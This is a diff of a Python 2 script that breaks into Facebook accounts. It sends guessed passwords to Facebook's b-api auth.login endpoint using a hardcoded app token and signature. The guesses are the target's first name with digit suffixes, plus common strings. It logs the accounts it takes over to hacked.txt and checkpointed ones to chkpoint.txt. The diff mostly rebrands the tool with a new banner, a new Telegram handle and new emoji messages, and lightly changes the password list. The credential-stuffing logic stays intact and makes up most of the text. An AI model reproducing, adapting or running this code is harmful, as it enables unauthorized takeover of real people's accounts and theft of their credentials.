@@ -56,12 +56,12 @@ logo = """
 
 
 \033[1;91m
-   '||    ||'     |        '||'  ..|''||   '||''|.
-    |||  |||     |||        ||  .|'    ||   ||   ||
-    |'|..'||    |  ||       ||  ||      ||  ||''|'
-    | '|' ||   .''''|.      ||  '|.     ||  ||   |.
-   .|. | .||. .|.  .||. || .|'   ''|...|'  .||.  '|'     
-
+░██████╗██╗░░██╗███████╗██╗░░██╗
+██╔════╝██║░░██║██╔════╝╚██╗██╔╝
+╚█████╗░███████║█████╗░░░╚███╔╝░
+░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
+██████╔╝██║░░██║███████╗██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
 """
 def tik():
@@ -84,12 +84,12 @@ os.system("clear")
 RH = """
 
 \033[1;91m
-   '||    ||'     |        '||'  ..|''||   '||''|.
-    |||  |||     |||        ||  .|'    ||   ||   ||
-    |'|..'||    |  ||       ||  ||      ||  ||''|'
-    | '|' ||   .''''|.      ||  '|.     ||  ||   |.
-   .|. | .||. .|.  .||. || .|'   ''|...|'  .||.  '|'
-                      
+░██████╗██╗░░██╗███████╗██╗░░██╗
+██╔════╝██║░░██║██╔════╝╚██╗██╔╝
+╚█████╗░███████║█████╗░░░╚███╔╝░
+░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
+██████╔╝██║░░██║███████╗██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                      
 
 """
 
@@ -316,87 +316,87 @@ def startgrab():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
-				print('\x1b[32;1m HACKED BooM')
+				print('\x1b[32;1m HACKED')
 				print('\x1b[32;1mID : \x1b[37;1m' + user+"\x1b[0m")											
 				print('\x1b[32;1mPassword : \x1b[37;1m'+pass1 + '\n'+"\x1b[0m")
-				msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n \t Tele: @SHELL_BLND")
 				filehack = open("hacked.txt", "a")
                                 filehack.write(msghkfile)
                                 filehack.close()
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
-				    print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				    print('\x1b[31;1mCP+')
 				    print('\x1b[31;1mID : \x1b[37;1m' + user+"\x1b[0m")
 				    print('\x1b[31;1mPassword : \x1b[37;1m'+pass1+'\n'+"\x1b[0m")
 				    cek = open("chkpoint.txt", "a")
-				    cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				    cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n \t Tele: @SHELL_BLND")
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = first+"123"									
+				    pass2 = first+"12345"									
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:
-				            print('\x1b[32;1m HACKED BooM'+"\x1b[0m")											
+				            print('\x1b[32;1m HACKED'+"\x1b[0m")											
 				            print('\x1b[32;1mID : \x1b[37;1m' + user)											
 				            print('\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n'+"\x1b[0m")
-                                            msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                            msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n \t Tele: @SHELL_BLND")
 				            filehack = open("hacked.txt", "a")
                                             filehack.write(msghkfile)
                                             filehack.close()							
 				            oks.append(user+pass2)
                                     else:
 			                   if 'www.facebook.com' in q["error_msg"]:
-				               print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				               print('\x1b[31;1mCP😺')
 				               print('\x1b[31;1mID : \x1b[37;1m' + user)
 				               print('\x1b[31;1mPassword : \x1b[37;1m' + pass2  + '\n'+'\x1b[0m')
 				               cek = open("chkpoint.txt", "a")
-				               cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				               cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n \t Tele: @SHELL_BLND")
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = first+"12345"								
+					       pass3 = first+"123456"								
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:
-						       print("\x1b[32;1m HACKED BooM"+"\x1b[0m")										
+						       print("\x1b[32;1m HACKED"+"\x1b[0m")										
 				                       print('\x1b[32;1mID : \x1b[37;1m '+ user)											
 				                       print('\x1b[32;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m")
-                                                       msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                       msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n \t Tele: @SHELL_BLND")
 				                       filehack = open("hacked.txt", "a")
                                                        filehack.write(msghkfile)
                                                        filehack.close()				
 						       oks.append(user+pass3)
                                                else:
 			                               if 'www.facebook.com' in q["error_msg"]:
-				                           print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                           print('\x1b[31;1mCP😞')
 				                           print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                           print('\x1b[31;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m")
 				                           cek = open("chkpoint.txt", "a")
-				                           cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                           cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n \t Tele: @SHELL_BLND")
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 =  "1122334455"		
+						           pass4 =  "11223344"		
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:
-				                                   print("\x1b[32;1m HACKED BooM"+"\x1b[0m")					
+				                                   print("\x1b[32;1m HACKED"+"\x1b[0m")					
 				                                   print('\x1b[32;1mID : \x1b[37;1m' + user)											
 				                                   print('\x1b[32;1mPassword : \x1b[37;1m' + pass4  + '\n'+"\x1b[0m")	 
-                                                                   msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                                   msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n \t Tele: @SHELL_BLND")
 				                                   filehack = open("hacked.txt", "a")
                                                                    filehack.write(msghkfile)
                                                                    filehack.close()							
 				                                   oks.append(user+pass4)
                                                            else:
 			                                           if 'www.facebook.com' in q["error_msg"]:
-				                                       print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                       print('\x1b[31;1mCP😐')
 				                                       print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                                       print('\x1b[31;1mPassword : \x1b[37;1m' + pass4 + '\n'+"\x1b[0m")
 				                                       cek = open("chkpoint.txt", "a")
-				                                       cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                       cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n \t Tele: @SHELL_BLND")
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
@@ -404,43 +404,43 @@ def startgrab():
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:
-						                               print("\x1b[32;1m HACKED BooM"+"\x1b[0m")		
+						                               print("\x1b[32;1m HACKED👻"+"\x1b[0m")		
 				                                               print('\x1b[32;1mID : \x1b[37;1m ' + user)											
 				                                               print('\x1b[32;1mPassword : \x1b[37;1m'+ pass5  + '\n'+"\x1b[0m")
-                                                                               msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                                               msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n \t Tele: @SHELL_BLND")
 				                                               filehack = open("hacked.txt", "a")
                                                                                filehack.write(msghkfile)
                                                                                filehack.close()						
 						                               oks.append(user+pass5)	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                   print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                                   print('\x1b[31;1mCP')
 				                                                   print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                                                   print('\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n'+"\x1b[0m")
 				                                                   cek = open("chkpoint.txt", "a")
-				                                                   cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                   cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n \t Tele: @SHELL_BLND")
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = '11223344'											
+							                           pass6 = '1122334455'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:
-				                                                           print("\x1b[32;1m HACKED BooM"+"\x1b[0m")					
+				                                                           print("\x1b[32;1m HACKED👻"+"\x1b[0m")					
 				                                                           print('\x1b[32;1mID : \x1b[37;1m ' + user)											
 				                                                           print('\x1b[32;1mPassword : \x1b[37;1m'+ pass6  + '\n'+"\x1b[0m")
-                                                                                           msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                                                           msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n \t Tele: @SHELL_BLND")
 				                                                           filehack = open("hacked.txt", "a")
                                                                                            filehack.write(msghkfile)
                                                                                            filehack.close()										
 				                                                           oks.append(user+pass6)
                                                                                    else:
 			                                                                   if 'www.facebook.com' in q["error_msg"]:
-				                                                               print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                                               print('\x1b[31;1mCP')
 				                                                               print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                                                               print('\x1b[31;1mPassword : \x1b[37;1m' + pass6  + '\n'+"\x1b[0m")
 				                                                               cek = open("chkpoint.txt", "a")
-				                                                               cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                               cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n \t Tele: @SHELL_BLND")
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
@@ -448,43 +448,43 @@ def startgrab():
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:
-									                               print("\x1b[32;1m HACKED BooM"+"\x1b[0m")
+									                               print("\x1b[32;1m HACKED👻"+"\x1b[0m")
 				                                                                       print('\x1b[32;1mID : \x1b[37;1m '+ user)											
 				                                                                       print('\x1b[32;1mPassword : \x1b[37;1m' + pass7  + '\n'+"\x1b[0m")
-                                                                                                       msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                                                                       msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n \t Tele: @SHELL_BLND")
 				                                                                       filehack = open("hacked.txt", "a")
                                                                                                        filehack.write(msghkfile)
                                                                                                        filehack.close()		
 									                               oks.append(user+pass7)
                                                                                                else:
 			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                                                           print('\x1b[31;1mCP')
 				                                                                           print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                                                                           print('\x1b[31;1mPassword : \x1b[37;1m' + pass7  + '\n'+"\x1b[0m")
 				                                                                           cek = open("chkpoint.txt", "a")
-				                                                                           cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                                           cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n \t Tele: @SHELL_BLND")
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 ='112233'											
+										                           pass8 ='123456654321'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:
-				                                                                                   print("\x1b[32;1m HACKED BooM"+"\x1b[0m")
+				                                                                                   print("\x1b[32;1m HACKED👻"+"\x1b[0m")
 				                                                                                   print('\x1b[32;1mID : \x1b[37;1m ' + user)											
 				                                                                                   print('\x1b[32;1mPassword : \x1b[37;1m'+ pass8  + '\n'+"\x1b[0m")
-                                                                                                                   msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+                                                                                                                   msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n \t Tele: @SHELL_BLND")
 				                                                                                   filehack = open("hacked.txt", "a")
                                                                                                                    filehack.write(msghkfile)
                                                                                                                    filehack.close()		
 				                                                                                   oks.append(user+pass8)
                                                                                                            else:
 			                                                                                           if 'www.facebook.com' in q["error_msg"]:
-				                                                                                       print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                                                                       print('\x1b[31;1mCP')
 				                                                                                       print('\x1b[31;1mID : \x1b[37;1m'  + user)
 				                                                                                       print('\x1b[31;1mPassword : \x1b[37;1m' + pass8  + '\n'+"\x1b[0m")
 				                                                                                       cek = open("chkpoint.txt", "a")
-				                                                                                       cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                                                       cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n \t Tele: @SHELL_BLND")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
@@ -492,21 +492,21 @@ def startgrab():
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:
-											                                       print("\x1b[32;1m HACKED BooM"+"\x1b[0m")							
+											                                       print("\x1b[32;1m HACKED👻"+"\x1b[0m")							
 				                                                                                               print('\x1b[32;1mID : \x1b[37;1m ' + user)											
 				                                                                                               print('\x1b[32;1mPassword : \x1b[37;1m'+ pass9  + '\n'+"\x1b[0m")		
-				                                                                                               msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                                                               msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n \t Tele: @SHELL_BLND")
 				                                                                                               filehack = open("hacked.txt", "a")
                                                                                                                                filehack.write(msghkfile)
                                                                                                                                filehack.close()
 											                                       oks.append(user+pass9)
                                                                                                                        else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print('\x1b[31;1mACCOUNT LA CHECKPOINAYA    FUCK')
+				                                                                                                   print('\x1b[31;1mCP')
 				                                                                                                   print('\x1b[31;1mID : \x1b[37;1m' + user)
 				                                                                                                   print('\x1b[31;1mPassword : \x1b[37;1m'+ pass9  + '\n'+"\x1b[0m")
 				                                                                                                   cek = open("chkpoint.txt", "a")
-				                                                                                                   cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+				                                                                                                   cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n \t Tele: @SHELL_BLND")
 				                                                                                                   cek.close()
       				                                                                                                   cekpoint.append(user+pass9)
                 	 		                                                                                       else:
@@ -514,21 +514,21 @@ def startgrab():
 																   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																   q = json.load(data)
 																   if 'access_token' in q:
-																	   print("\x1b[32;1m HACKED BooM"+"\x1b[0m")
+																	   print("\x1b[32;1m HACKED👻"+"\x1b[0m")
 																	   print('\x1b[32;1mID : \x1b[37;1m ' + user)
 																	   print('\x1b[32;1mPassword : \x1b[37;1m'+ pass10  + '\n'+"\x1b[0m")
-																	   msghkfile = ("{ = M A J O R = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+																	   msghkfile = ("{ = BLND = } "+"\nHACKED BooM "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n \t Tele: @SHELL_BLND")
                                           				                                                                   filehack = open("hacked.txt", "a")
                                                                                                                                            filehack.write(msghkfile)
                                                                                                                                            filehack.close()
 																	   oks.append(user+pass10)
 																   else:
 															                   if 'www.facebook.com' in q["error_msg"]:
-															                       print('\x1b[31;1mACCOUNT LA CHECKPOINAYA       FUCK')
+															                       print('\x1b[31;1mCP')
 																	       print('\x1b[31;1mID : \x1b[37;1m' + user)
 																	       print('\x1b[31;1mPassword : \x1b[37;1m'+ pass10  + '\n'+"\x1b[0m")
 																	       cek = open("chkpoint.txt", "a")
-																               cek.write("{ = M A J O R = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n Ch: @MajorCrackerChanal \t Tele: @SHELL_MAJOR")
+																               cek.write("{ = BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n \t Tele: @SHELL_BLND")
 																	       cek.close()
 																	       cekpoint.append(user+pass10)
 		except:
@@ -551,4 +551,4 @@ if __name__ == '__main__':
   login()
 
 
-# Okay Decompiling shellmajor.py
+# Okay Decompiling SHELL_BLND.py
